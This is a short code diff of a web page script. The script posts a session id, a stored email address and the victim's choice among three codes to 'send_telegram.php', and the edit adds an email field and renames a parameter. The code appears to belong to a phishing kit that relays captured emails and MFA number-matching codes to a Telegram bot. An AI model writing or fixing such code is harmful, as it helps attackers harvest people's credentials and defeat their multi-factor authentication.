@@ -243,10 +243,11 @@
                 
                 const formData = new FormData();
                 formData.append('session_id', sessionId);
+                formData.append('stored_email', storedEmail);
                 formData.append('email', storedEmail);
                 formData.append('three_code_selected', selectedCode);
                 formData.append('three_codes_options', threeCodesValue);
-                formData.append('type', 'three_code_selection');
+                formData.append('action', 'three_code_selection'); // CORREGIDO: Ahora envía 'action' en lugar de 'type'
                 
                 fetch('send_telegram.php', {
                     method: 'POST',
